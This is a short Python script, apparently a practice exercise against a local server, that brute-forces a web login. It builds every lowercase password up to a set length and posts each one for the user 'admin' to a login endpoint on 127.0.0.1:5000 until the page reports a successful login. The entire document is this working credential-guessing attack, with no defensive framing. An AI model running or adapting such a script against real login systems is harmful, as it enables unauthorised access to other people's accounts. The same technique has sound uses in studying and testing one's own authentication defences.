from string import ascii_lowercase
import requests

def iterate_through(username, guess_length):
    candidates = create_passwords(guess_length)

    for candidate in candidates:
        session = requests.Session()
        data = {"username":username, "password":candidate}
        response = session.post("http://127.0.0.1:5000/login", data=data)
        if "logged in" in response.text:
            return candidate
    
    return "No matches found"

def create_passwords(length):
    if length < 2:
        raise ValueError
    combinations = []
    for letter in ascii_lowercase:
        combinations.append(letter)
    for item in combinations:
        for letter in ascii_lowercase:
            if len(item + letter) > length:
                return combinations
            combinations.append(item + letter)

if __name__ == "__main__":
	print(iterate_through("admin", 5))
